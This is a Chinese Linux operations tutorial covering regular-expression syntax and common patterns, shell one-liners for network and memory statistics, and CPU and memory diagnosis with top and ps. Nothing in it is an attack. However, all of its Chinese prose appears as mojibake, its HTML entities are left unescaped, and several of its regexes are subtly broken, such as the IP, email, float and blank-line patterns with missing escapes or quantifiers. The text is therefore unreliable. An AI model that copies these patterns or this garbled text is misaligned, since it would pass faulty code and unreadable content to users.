3)ç‰¹æ®Šå­—ç¬¦æ‰€è°“ç‰¹æ®Šå­—ç¬¦ï¼Œå°±æ˜¯ä¸€äº›æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ã€‚â€˜*â€™ï¼Œâ€™+â€˜å’Œâ€™?â€™è¿™ä¸‰ä¸ªç¬¦å·ï¼Œè¡¨ç¤ºä¸€ä¸ªæˆ–ä¸€åºåˆ—å­—ç¬¦é‡å¤å‡ºç°çš„æ¬¡æ•°ã€‚å®ƒä»¬åˆ†åˆ«è¡¨ç¤ºâ€œæ²¡æœ‰æˆ–æ›´å¤šâ€ï¼Œâ€œä¸€æ¬¡æˆ–æ›´å¤šâ€è¿˜æœ‰â€œæ²¡æœ‰æˆ–ä¸€æ¬¡â€ã€‚è‹¥è¦åŒ¹é…è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¿…é¡»é¦–å…ˆä½¿å­—ç¬¦â€è½¬ä¹‰â€ï¼Œå³ï¼Œå°†åæ–œæ å­—ç¬¦\\ æ”¾åœ¨å®ƒä»¬å‰é¢ï¼› 4ï¼‰é™å®šç¬¦ç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºç°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…ã€‚æœ‰ * æˆ– + æˆ– ? æˆ– {n} æˆ– {n,} æˆ– {n,m} å…±6ç§ã€‚ ç¤ºä¾‹ï¼š [0-9]* è¡¨ç¤ºä»»æ„å¤šä¸ªæ•°å­—;åœ¨æ–¹æ‹¬å·é‡Œç”¨ â€˜^â€™è¡¨ç¤ºä¸å¸Œæœ›å‡ºç°çš„å­—ç¬¦ï¼Œâ€™^â€™åº”åœ¨æ–¹æ‹¬å·é‡Œçš„ç¬¬ä¸€ä½;â€œ(bÂ¦cd)efâ€ï¼šè¡¨ç¤ºâ€befâ€æˆ–â€cdefâ€ï¼›123è¯·æ³¨æ„è¡¨ç¤ºèŒƒå›´:å¿…é¡»æŒ‡å®šèŒƒå›´çš„ä¸‹é™;å¦‚ï¼šâ€{0,2}â€è€Œä¸æ˜¯â€{,2}â€ã€‚2ï¼‰â€™â€˜ï¼Œâ€™+â€™å’Œâ€™?â€™ç›¸å½“äºâ€{0,}â€ï¼Œâ€{1,}â€å’Œâ€{0,1}â€ã€‚3)â€™Â¦â€™ï¼Œè¡¨ç¤ºâ€œæˆ–â€æ“ä½œã€‚åœ¨æ–¹æ‹¬å·é‡Œç”¨â€™^â€™è¡¨ç¤ºä¸å¸Œæœ›å‡ºç°çš„å­—ç¬¦ï¼Œâ€™^â€™åº”åœ¨æ–¹æ‹¬å·é‡Œçš„ç¬¬ä¸€ä½ï¼Œåœ¨æ–¹æ‹¬å·ä¸­ï¼Œä¸éœ€è¦è½¬ä¹‰å­—ç¬¦ã€‚4) å’Œ + é™å®šç¬¦éƒ½æ˜¯è´ªå©ªçš„ï¼Œå› ä¸ºå®ƒä»¬ä¼šå°½å¯èƒ½å¤šçš„åŒ¹é…æ–‡å­—ï¼Œåªæœ‰åœ¨å®ƒä»¬çš„åé¢åŠ ä¸Šä¸€ä¸ª? å°±å¯ä»¥å®ç°éè´ªå©ªæˆ–æœ€å°åŒ¹é…ã€‚é€šè¿‡åœ¨ *ã€+ æˆ– ? é™å®šç¬¦ä¹‹åæ”¾ç½® ?ï¼Œè¯¥è¡¨è¾¾å¼ä»â€è´ªå©ªâ€è¡¨è¾¾å¼è½¬æ¢ä¸ºâ€éè´ªå©ªâ€è¡¨è¾¾å¼æˆ–è€…æœ€å°åŒ¹é…ã€‚5ï¼‰å…¶ä»–å­—ç¬¦åŒ¹é…(Javaæ­£åˆ™è¡¨è¾¾å¼)ï¼š\\d ï¼šåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚[0-9]\\D ï¼šåŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚[^0-9]\\w ï¼šåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚[0-9a-zA-Z_]\\W ï¼šåŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚[^\\w]\\s ï¼šåŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦\\S ï¼šåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚12345678910115)å®šä½ç¬¦ å®šä½ç¬¦ä½¿æ‚¨èƒ½å¤Ÿå°†æ­£åˆ™è¡¨è¾¾å¼å›ºå®šåˆ°è¡Œé¦–æˆ–è¡Œå°¾ã€‚å®šä½ç¬¦ç”¨æ¥æè¿°å­—ç¬¦ä¸²æˆ–å•è¯çš„è¾¹ç•Œï¼Œ^ å’Œ $ åˆ†åˆ«æŒ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä¸ç»“æŸï¼Œ\\b æè¿°å•è¯çš„å‰æˆ–åè¾¹ç•Œï¼Œ\\B è¡¨ç¤ºéå•è¯è¾¹ç•Œã€‚ æ³¨æ„ï¼šä¸èƒ½å°†é™å®šç¬¦ä¸å®šä½ç¬¦ä¸€èµ·ä½¿ç”¨ã€‚ç”±äºåœ¨ç´§é æ¢è¡Œæˆ–è€…å•è¯è¾¹ç•Œçš„å‰é¢æˆ–åé¢ä¸èƒ½æœ‰ä¸€ä¸ªä»¥ä¸Šä½ç½®ï¼Œå› æ­¤ä¸å…è®¸è¯¸å¦‚ ^* ä¹‹ç±»çš„è¡¨è¾¾å¼ã€‚ è‹¥è¦åŒ¹é…ä¸€è¡Œæ–‡æœ¬å¼€å§‹å¤„çš„æ–‡æœ¬ï¼Œè¯·åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹ä½¿ç”¨ ^ å­—ç¬¦ã€‚ä¸è¦å°† ^ çš„è¿™ç§ç”¨æ³•ä¸ä¸­æ‹¬å·è¡¨è¾¾å¼å†…çš„ç”¨æ³•æ··æ·†ã€‚è‹¥è¦åŒ¹é…ä¸€è¡Œæ–‡æœ¬çš„ç»“æŸå¤„çš„æ–‡æœ¬ï¼Œè¯·åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„ç»“æŸå¤„ä½¿ç”¨ $ å­—ç¬¦ã€‚ \\B éå•è¯è¾¹ç•Œè¿ç®—ç¬¦ï¼Œä½ç½®å¹¶ä¸é‡è¦ï¼Œå› ä¸ºåŒ¹é…ä¸å…³å¿ƒç©¶ç«Ÿæ˜¯å•è¯çš„å¼€å¤´è¿˜æ˜¯ç»“å°¾ã€‚ åŒ¹é…ä¸­æ–‡å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š [\\u4e00-\\u9fa5]è¯„æ³¨ï¼šåŒ¹é…ä¸­æ–‡è¿˜çœŸæ˜¯ä¸ªå¤´ç–¼çš„äº‹ï¼Œæœ‰äº†è¿™ä¸ªè¡¨è¾¾å¼å°±å¥½åŠäº†åŒ¹é…åŒå­—èŠ‚å­—ç¬¦(åŒ…æ‹¬æ±‰å­—åœ¨å†…)ï¼š[^\\x00-\\xff]è¯„æ³¨ï¼šå¯ä»¥ç”¨æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆä¸€ä¸ªåŒå­—èŠ‚å­—ç¬¦é•¿åº¦è®¡2ï¼ŒASCIIå­—ç¬¦è®¡1ï¼‰åŒ¹é…ç©ºç™½è¡Œçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\\n\\s\\rè¯„æ³¨ï¼šå¯ä»¥ç”¨æ¥åˆ é™¤ç©ºç™½è¡ŒåŒ¹é…HTMLæ ‡è®°çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š&lt;(\\S*?)[^&gt;]&gt;.?&lt;&#x2F;\\1&gt;|&lt;.*? &#x2F;&gt;è¯„æ³¨ï¼šç½‘ä¸Šæµä¼ çš„ç‰ˆæœ¬å¤ªç³Ÿç³•ï¼Œä¸Šé¢è¿™ä¸ªä¹Ÿä»…ä»…èƒ½åŒ¹é…éƒ¨åˆ†ï¼Œå¯¹äºå¤æ‚çš„åµŒå¥—æ ‡è®°ä¾æ—§æ— èƒ½ä¸ºåŠ›åŒ¹é…é¦–å°¾ç©ºç™½å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š^\\s|\\s*$è¯„æ³¨ï¼šå¯ä»¥ç”¨æ¥åˆ é™¤è¡Œé¦–è¡Œå°¾çš„ç©ºç™½å­—ç¬¦(åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰)ï¼Œéå¸¸æœ‰ç”¨çš„è¡¨è¾¾å¼åŒ¹é…Emailåœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)è¯„æ³¨ï¼šè¡¨å•éªŒè¯æ—¶å¾ˆå®ç”¨åŒ¹é…ç½‘å€URLçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š[a-zA-z]+:&#x2F;&#x2F;[^\\s]è¯„æ³¨ï¼šç½‘ä¸Šæµä¼ çš„ç‰ˆæœ¬åŠŸèƒ½å¾ˆæœ‰é™ï¼Œä¸Šé¢è¿™ä¸ªåŸºæœ¬å¯ä»¥æ»¡è¶³éœ€æ±‚åŒ¹é…å¸å·æ˜¯å¦åˆæ³•(å­—æ¯å¼€å¤´ï¼Œå…è®¸5-16å­—èŠ‚ï¼Œå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿)ï¼š^[a-zA-Z][a-zA-Z0-9_]{4,15}$è¯„æ³¨ï¼šè¡¨å•éªŒè¯æ—¶å¾ˆå®ç”¨åŒ¹é…å›½å†…ç”µè¯å·ç ï¼š\\d{3}-\\d{8}|\\d{4}-\\d{7}è¯„æ³¨ï¼šåŒ¹é…å½¢å¼å¦‚ 0511-4405222 æˆ– 021-87888822åŒ¹é…è…¾è®¯QQå·ï¼š[1-9][0-9]{4,}è¯„æ³¨ï¼šè…¾è®¯QQå·ä»10000å¼€å§‹åŒ¹é…ä¸­å›½é‚®æ”¿ç¼–ç ï¼š[1-9]\\d{5}(?!\\d)è¯„æ³¨ï¼šä¸­å›½é‚®æ”¿ç¼–ç ä¸º6ä½æ•°å­—åŒ¹é…èº«ä»½è¯ï¼š\\d{15}|\\d{18}è¯„æ³¨ï¼šä¸­å›½çš„èº«ä»½è¯ä¸º15ä½æˆ–18ä½åŒ¹é…ipåœ°å€ï¼š\\d+.\\d+.\\d+.\\d+è¯„æ³¨ï¼šæå–ipåœ°å€æ—¶æœ‰ç”¨1234567891011121314151617181920212223242526åŒ¹é…ç‰¹å®šæ•°å­—ï¼š ^[1-9]\\d*$ &#x2F;&#x2F;åŒ¹é…æ­£æ•´æ•°^-[1-9]\\d*$ &#x2F;&#x2F;åŒ¹é…è´Ÿæ•´æ•°^-?[1-9]\\d*$ &#x2F;&#x2F;åŒ¹é…æ•´æ•°^[1-9]\\d*|0$ &#x2F;&#x2F;åŒ¹é…éè´Ÿæ•´æ•°ï¼ˆæ­£æ•´æ•° + 0ï¼‰^-[1-9]\\d*|0$ &#x2F;&#x2F;åŒ¹é…éæ­£æ•´æ•°ï¼ˆè´Ÿæ•´æ•° + 0ï¼‰^[1-9]\\d.\\d|0.\\d*[1-9]\\d*$ &#x2F;&#x2F;åŒ¹é…æ­£æµ®ç‚¹æ•°^-([1-9]\\d.\\d|0.\\d*[1-9]\\d*)$ &#x2F;&#x2F;åŒ¹é…è´Ÿæµ®ç‚¹æ•°^-?([1-9]\\d.\\d|0.\\d*[1-9]\\d*|0?.0+|0)$ &#x2F;&#x2F;åŒ¹é…æµ®ç‚¹æ•°^[1-9]\\d.\\d|0.\\d*[1-9]\\d*|0?.0+|0$ &#x2F;&#x2F;åŒ¹é…éè´Ÿæµ®ç‚¹æ•°ï¼ˆæ­£æµ®ç‚¹æ•° + 0ï¼‰^(-([1-9]\\d.\\d|0.\\d*[1-9]\\d*))|0?.0+|0$ &#x2F;&#x2F;åŒ¹é…éæ­£æµ®ç‚¹æ•°ï¼ˆè´Ÿæµ®ç‚¹æ•° + 0ï¼‰12345678910åŒ¹é…ç‰¹å®šå­—ç¬¦ä¸²ï¼š ^[A-Za-z]+$ &#x2F;&#x2F;åŒ¹é…ç”±26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²^[A-Z]+$ &#x2F;&#x2F;åŒ¹é…ç”±26ä¸ªè‹±æ–‡å­—æ¯çš„å¤§å†™ç»„æˆçš„å­—ç¬¦ä¸²^[a-z]+$ &#x2F;&#x2F;åŒ¹é…ç”±26ä¸ªè‹±æ–‡å­—æ¯çš„å°å†™ç»„æˆçš„å­—ç¬¦ä¸²^[A-Za-z0-9]+$ &#x2F;&#x2F;åŒ¹é…ç”±æ•°å­—å’Œ26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²^\\w+$ &#x2F;&#x2F;åŒ¹é…ç”±æ•°å­—ã€26ä¸ªè‹±æ–‡å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²1234512ã€é«˜çº§å‘½ä»¤ç»„åˆSHELLæ˜¾ç¤ºå¤šä¸ªä¿¡æ¯ï¼Œç”¨EOFcat &lt;&lt; EOF+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+| &#x3D;&#x3D;&#x3D; Welcome to Nginx Home &#x3D;&#x3D;&#x3D; |+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+EOF12345è·å–IPåœ°å€ifconfig eth0 |grep â€œinet addr:â€ |awk â€˜{print $2}â€™|cut -c 6- &#x2F;&#x2F;6-è¡¨ä»å·¦ç¬¬6ä¸ªå­—ç¬¦å¼€å§‹è·å–ifconfig eth0 |grep â€œinet â€œ |awk â€˜{print $2}â€™|cut -c 6-æˆ–è€…ifconfig | grep â€˜inet addr:â€™| grep -v â€˜127.0.0.1â€™ | cut -d: -f2 | awk â€˜{ print $1}â€™ifconfig | grep â€˜inet â€˜| grep -v â€˜127.0.0.1â€™ | cut -d: -f2 | awk â€˜{ print $2}â€™ è·å–å†…å­˜free -m |grep â€œMemâ€ | awk â€˜{print $2}â€™ æŸ¥çœ‹è¿æ¥æŸæœåŠ¡ç«¯å£æœ€å¤šçš„çš„IPåœ°å€netstat -an -t | grep â€œ:80â€ | grep ESTABLISHED | awk â€˜{printf â€œ%s %s\\nâ€,$5,$6}â€™ | sort æŸ¥çœ‹Apacheçš„å¹¶å‘è¯·æ±‚æ•°åŠå…¶TCPè¿æ¥çŠ¶æ€ï¼šnetstat -n | awk â€˜&#x2F;^tcp&#x2F; {++S[$NF]} END {for(a in S) print a, S[a]}â€™ ç»Ÿè®¡æŸä¸€ç±»æ–‡ä»¶å¤§å°eg1ï¼šfind &#x2F; -name *.jpg -exec wc -c {} ;|awk â€˜{print $1}â€™|awk â€˜{a+&#x3D;$1}END{print a}â€™ æ¸…é™¤åƒµæ­»è¿›ç¨‹ps -eal | awk â€˜{ if ($2 &#x3D;&#x3D; â€œZâ€) {print $4}}â€™ | kill -9 13ã€30ä¸ªå¸¸ç”¨å¿«æ·é”® 14ã€è¿ç»´å®æˆ˜aã€ç³»ç»Ÿè´Ÿè½½æŸ¥è¯¢ç¡®è®¤1&gt;CPUè´Ÿè½½æƒ…å†µ1ï¼‰æŸ¥çœ‹é€»è¾‘CPUä¸ªæ•°ï¼šcat &#x2F;proc&#x2F;cpuinfo |grep â€œprocessorâ€|sort -u|wc -l2ï¼‰æŸ¥çœ‹ç‰©ç†CPUä¸ªæ•°ï¼šgrep â€œphysical idâ€ &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l3ï¼‰æŸ¥çœ‹æ¯é¢—ç‰©ç†CPUæ ¸æ•°ï¼šcat &#x2F;proc&#x2F;cpuinfo |grep â€œcoresâ€|uniqæ¯ä¸ªç‰©ç†CPUä¸Šé€»è¾‘CPUä¸ªæ•°ï¼šgrep â€œsiblingsâ€ &#x2F;proc&#x2F;cpuinfo|uniqæŸ¥çœ‹æ˜¯å¦å¼€å¯äº†æŠ„è¶…çº¿ç¨‹ï¼šå¦‚å¤šä¸ªé€»è¾‘CPUçš„â€physical idâ€å’Œâ€core idâ€å‡ç›¸åŒï¼Œè¯´æ˜å¼€å¯äº†è¶…çº¿ç¨‹ï¼›é€»è¾‘å¦‚ä¸‹ï¼ša.é€»è¾‘CPUä¸ªæ•° &gt; ç‰©ç†CPUä¸ªæ•° * CPUå†…æ ¸æ•° å¼€å¯äº†è¶…çº¿ç¨‹b.é€»è¾‘CPUä¸ªæ•° &#x3D; ç‰©ç†CPUä¸ªæ•° * CPUå†…æ ¸æ•° æ²¡æœ‰å¼€å¯è¶…çº¿ç¨‹4ï¼‰æŸ¥çœ‹CPUçš„ä¸»é¢‘ï¼šcat &#x2F;proc&#x2F;cpuinfo |grep MHz|uniq #!&#x2F;bin&#x2F;bash å®šä¹‰åˆå§‹å˜é‡physicalNumber&#x3D;0 coreNumber&#x3D;0 logicalNumber&#x3D;0 HTNumber&#x3D;0##è·å–ç³»ç»Ÿå‚æ•°å€¼logicalNumber&#x3D;$(grep â€œprocessorâ€ &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l) physicalNumber&#x3D;$(grep â€œphysical idâ€ &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l) coreNumber&#x3D;$(grep â€œcpu coresâ€ &#x2F;proc&#x2F;cpuinfo|uniq|awk -Fâ€™:â€™ â€˜{print $2}â€™|xargs) HTNumber&#x3D;$((logicalNumber &#x2F; (physicalNumber * coreNumber))) cpuHZ&#x3D;$(cat &#x2F;proc&#x2F;cpuinfo |grep MHz|uniq) echo â€œ****** CPU Information ******â€ echo â€œLogical CPU Number : ${logicalNumber}â€ echo â€œPhysical CPU Number : ${physicalNumber}â€ echo â€œCPU Core Number : ${coreNumber}â€ echo â€œHT Number : ${HTNumber}â€ echo â€œSysten cpu MHZ : ${cpuHZ}â€ echo â€œ*****************************â€123456789101112131415161718192021222324252627282930313233 5ï¼‰topå‘½ä»¤ï¼š å…¶ä¸­ï¼šload averageè¿™ä¸‰ä¸ªå€¼ï¼Œéš”5ç§’é’Ÿæ£€æŸ¥ä¸€æ¬¡æ´»è·ƒçš„è¿›ç¨‹æ•°ï¼Œç„¶åæŒ‰ç‰¹å®šç®—æ³•è®¡ç®—å‡ºçš„æ•°å€¼;é»˜è®¤ä¸è¶…è¿‡cpuåˆæ•°çš„2å€ä¸ºå¥½ï¼Œè¶…è¿‡2å€è¯´æ˜è´Ÿè½½åé«˜ï¼›å¦‚æœè¿™ä¸ªæ•°é™¤ä»¥é€»è¾‘CPUçš„æ•°é‡ï¼Œç»“æœé«˜äº5çš„æ—¶å€™å°±è¡¨æ˜ç³»ç»Ÿåœ¨è¶…è´Ÿè·è¿è½¬äº†ï¼›ç»éªŒè¡¨æ˜ï¼šæ¯å•æ ¸è´Ÿè½½åœ¨3-5ä¹‹é—´å°šå¯ï¼Œè¶…è¿‡6ç”šè‡³8ï¼Œå°±è¦ç«‹åˆ»æ’æŸ¥cpuè´Ÿè½½é«˜çš„é—®é¢˜ï¼Œå¦åˆ™ææ˜“å®•æœºã€‚æ£€æŸ¥%idleæ˜¯å¦è¿‡ä½(æ¯”å¦‚å°äº5%)ï¼› us ç”¨æˆ·ç©ºé—´å ç”¨CPUç™¾åˆ†æ¯”ï¼› sy å†…æ ¸ç©ºé—´å ç”¨CPUç™¾åˆ†æ¯”ï¼›ni ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨CPUç™¾åˆ†æ¯”ï¼›id ç©ºé—²CPUç™¾åˆ†æ¯”ï¼›wa ç­‰å¾…è¾“å…¥è¾“å‡ºçš„CPUæ—¶é—´ç™¾åˆ†æ¯”ï¼›hi ç¡¬ä¸­æ–­ï¼ˆHardware IRQï¼‰å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼›si è½¯ä¸­æ–­ï¼ˆSoftware Interruptsï¼‰å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼›st ç”¨äºæœ‰è™šæ‹Ÿcpuçš„æƒ…å†µï¼Œç”¨æ¥æŒ‡ç¤ºè¢«è™šæ‹Ÿæœºå·æ‰çš„cpuæ—¶é—´ã€‚ è¾“å‡ºç»“æœè¯´æ˜ï¼šPIDï¼šè¿›ç¨‹ç¼–å·USERï¼šè¿›ç¨‹æ‰€å±ç”¨æˆ·PR&#x2F;NIï¼šPriority&#x2F;Nice valueè¿›ç¨‹æ‰§è¡Œçš„ä¼˜å…ˆé¡ºåºVIRTï¼šVirtual Image (kb) è™šæ‹Ÿå†…å­˜ä½¿ç”¨æ€»é¢ï¼›è¿›ç¨‹â€œéœ€è¦çš„â€è™šæ‹Ÿå†…å­˜å¤§å°ï¼ŒåŒ…æ‹¬è¿›ç¨‹ä½¿ç”¨çš„åº“ã€ä»£ç ã€æ•°æ®ç­‰ï¼Œå³ä½¿è¿›ç¨‹å®é™…ä½¿ç”¨çš„è¿œå°‘äºæ”¹å€¼ï¼Œä½†è¿›ç¨‹è¿è¡Œæ»¡è½½æ—¶ä¼šè¾¾åˆ°æ”¹å€¼;VIRT&#x3D;SWAP+RESRESï¼šResident size (kb) å¸¸é©»å†…å­˜ï¼Œè¡¨è¿›ç¨‹å½“å‰ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼ŒåŒ…å«å…¶ä»–è¿›ç¨‹çš„å…±äº«ä½†ä¸åŒ…æ‹¬swap outï¼›RES&#x3D;CODE+DATASHRï¼šShared Mem size (kb) å…±äº«å†…å­˜ï¼›é™¤äº†è‡ªèº«è¿›ç¨‹çš„å…±äº«å†…å­˜ï¼Œä¹ŸåŒ…æ‹¬å…¶ä»–è¿›ç¨‹çš„å…±äº«å†…å­˜ï¼Œå³ä½¿è¿›ç¨‹åªä½¿ç”¨äº†å‡ ä¸ªå…±äº«åº“çš„å‡½æ•°ï¼Œä½†å®ƒç”¨äº†æ•´ä¸ªå…±äº«åº“çš„å¤§å°æ¥å ç”¨ï¼›å› æ­¤, æŸä¸ªè¿›ç¨‹æ‰€å çš„ç‰©ç†å†…å­˜å¤§å°å…¬å¼ï¼šRES â€“ SHRSï¼šProcess Status è¿›ç¨‹çŠ¶æ€ï¼šDä¸å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ Rè¿è¡Œæ€ Sç¡çœ æ€ Tè·Ÿè¸ª&#x2F;åœæ­¢æ€ Zåƒµå°¸æ€%CPUï¼šcpuä½¿ç”¨ç‡%MEMï¼šå†…å­˜ä½¿ç”¨ç‡TIME+ï¼šè¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶ä½¿ç”¨cpuçš„æ€»æ—¶é—´COMMANDï¼šè¿›ç¨‹è¿è¡Œçš„å‘½ä»¤ç¬¬ä¸‰è¡Œè¡¨ç¤ºcpuçš„è¿è¡Œæƒ…å†µï¼ŒæŒ‰ä¸‹1å¯ä»¥æ˜¾ç¤ºæ¯ä¸ªæ ¸çš„è¿è¡Œæƒ…å†µã€‚ topé»˜è®¤æ’åºæ˜¯%CPUï¼›shift+&gt; æˆ–è€…shift+&lt; å‘å³æˆ–è€…å‘å·¦åˆ‡æ¢æ’åºåŸºå‡†ï¼Œå…±12åˆ—ï¼Œcpuä¸º9åˆ—ï¼Œmemä¸º10åˆ—ã€‚æŒ‰xé«˜äº®æ˜¾ç¤ºï¼Œå¯çŸ¥é“å½“å‰æ˜¯å“ªä¸€è¡Œä¸ºæ’åºè¡Œã€‚ é»˜è®¤è¿›å…¥topæ—¶ï¼Œå„è¿›ç¨‹æ˜¯æŒ‰ç…§CPUçš„å ç”¨é‡æ¥æ’åºçš„ã€‚åœ¨topåŸºæœ¬è§†å›¾ä¸­ï¼ŒæŒ‰é”®æ•°å­—â€œ1â€å¯ä»¥ç›‘æ§æ¯ä¸ªé€»è¾‘CPUçš„çŠ¶å†µï¼›æŒ‰é”®â€˜bâ€™ï¼ˆæ‰“å¼€å…³é—­åŠ äº®æ•ˆæœï¼‰ï¼›â€˜yâ€™æ¥æ‰“å¼€æˆ–è€…å…³é—­è¿è¡Œæ€è¿›ç¨‹çš„åŠ äº®æ•ˆæœï¼›â€˜xâ€™ï¼ˆæ‰“å¼€&#x2F;å…³é—­æ’åºåˆ—çš„åŠ äº®æ•ˆæœï¼‰ï¼›æŒ‰â€shift+&gt;â€æˆ–è€…â€shift+&lt;â€å·¦å³æ”¹å˜æ’åºåºåˆ—ï¼›â€fâ€å¯è¿›å…¥ç¼–è¾‘åŸºæœ¬è§†å›¾ä¸­çš„æ˜¾ç¤ºå­—æ®µï¼› top -u root &#x2F;&#x2F;-uï¼šuseræ˜¾ç¤ºæŒ‡å®šç”¨æˆ·çš„è¿›ç¨‹ top -p 1 &#x2F;&#x2F;-pï¼špidæ˜¾ç¤ºæŒ‡å®šè¿›ç¨‹ è¿›å…¥topåï¼ŒæŒ‰nï¼šè®¾ç½®topå±å¹•æ˜¾ç¤ºçš„ä»»åŠ¡æ•° top -n 5 &#x2F;&#x2F;top -n numï¼šè®¾ç½®topåˆ·æ–°çš„æ¬¡æ•°ï¼ŒæŒ‡å®šåˆ·æ–°æ¬¡æ•°åå°†é€€å‡ºtopï¼Œé»˜è®¤ä¸€ç›´åˆ·top -d 5 &#x2F;&#x2F;delayè¿›å…¥topåï¼Œtopä¼šå®šæ—¶åˆ·æ–°çŠ¶æ€ï¼Œé»˜è®¤å€¼æ˜¯5 s,-då‚æ•°æŒ‡å®štopå‡ ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œå³åˆ·æ–°é¢‘ç‡top -b -n 60 -d 60 &gt; &#x2F;tmp&#x2F;cpu.txt &#x2F;&#x2F;-bï¼šBatch modeæ‰¹å¤„ç†æ¨¡å¼ï¼Œtopåˆ·æ–°çŠ¶æ€é»˜è®¤æ˜¯åœ¨åŸæ•°æ®ä¸Šåˆ·æ–°ï¼Œä½¿ç”¨-bå‚æ•°åï¼Œä¼šä¸€å±ä¸€å±çš„æ˜¾ç¤ºæ•°æ®ã€‚ç»“åˆé‡å®šå‘åŠŸèƒ½å’Œè®¡åˆ’ä»»åŠ¡ï¼Œ-bå‚æ•°åœ¨è®°å½•æœåŠ¡å™¨è¿è¡ŒçŠ¶æ€æ—¶éå¸¸æœ‰ç”¨ã€‚ -Mï¼šMemoryæŒ‰ç…§å†…å­˜ä½¿ç”¨é‡æ’åº-Pï¼šCPUæŒ‰ç…§cpuä½¿ç”¨é‡æ’åºè¿›å…¥topåæŒ‰ké”®ï¼šï¼ˆkillæ€æ­»PIDçš„è¿›ç¨‹ï¼‰top -H &#x2F;&#x2F;ä»¥çº¿ç¨‹æ–¹å¼æŸ¥çœ‹topè§†å›¾,ç­‰åŒäºtopå†…çš„Hé”® å¤§å†™çš„ R é”®å¯ä»¥å°†å½“å‰çš„æ’åºå€’è½¬;6ï¼‰è‡ªåŠ¨è®°å½•cpuä¸€æ®µæ—¶é—´çŠ¶æ€ï¼štop -b -n 60 -d 60 &gt; &#x2F;tmp&#x2F;cpu.txt 7ï¼‰top -H -p è¿›ç¨‹å· &#x2F;&#x2F;æŸ¥çœ‹å¼‚å¸¸çº¿ç¨‹ 8ï¼‰æŸ¥çœ‹å ç”¨cpué«˜çš„çº¿ç¨‹ps -H -eo user,pid,ppid,tid,time,%cpu,cmd â€“sort&#x3D;%cpuè¯´æ˜:â€˜Hâ€™ï¼Œæ˜¾ç¤ºçº¿ç¨‹ç›¸å…³;-oæŒ‡å®šæ˜¾ç¤ºçš„åˆ—ï¼› -T æ˜¾ç¤ºçº¿ç¨‹æ•° linuxä¸‹è·å–å ç”¨CPUèµ„æºæœ€å¤šçš„10ä¸ªè¿›ç¨‹ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head 9ï¼‰æŸ¥çœ‹å ç”¨å†…å­˜é«˜çš„çº¿ç¨‹ï¼šps aux | head -1;ps aux|sort -k4nr|head -5linuxä¸‹è·å–å ç”¨å†…å­˜èµ„æºæœ€å¤šçš„10ä¸ªè¿›ç¨‹:ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|headcat &#x2F;proc&#x2F;pid&#x2F;status &#x2F;&#x2F;æŸ¥çœ‹è¯¥è¿›ç¨‹çš„å†…å­˜å ç”¨æƒ…å†µ10ï¼‰æŸ¥çœ‹è¿›ç¨‹æŒ‰å†…å­˜ã€cpuä»å¤§åˆ°å°æ’åºï¼šps -e -o â€œ%C : %p : %z : %aâ€|sort -k5 -nrps -e -o â€œ%C : %p : %z : %aâ€|sort -nr11ï¼‰cat &#x2F;proc&#x2F;loadavg # æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½ 2&gt;å†…å­˜è´Ÿè½½æƒ…å†µ1ï¼‰æŸ¥çœ‹è¿›ç¨‹å†…å­˜çš„çŠ¶å†µï¼špmap PID; &#x2F;&#x2F;æŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æ˜ åƒä¿¡æ¯ è¯´æ˜ï¼š-dï¼šhow the deviceformat. æ˜¾ç¤ºè®¾å¤‡æ ¼å¼-q quiet ä¸æ˜¾ç¤ºå¤´å°¾è¡Œ-x extended æ˜¾ç¤ºæ‰©å±•æ 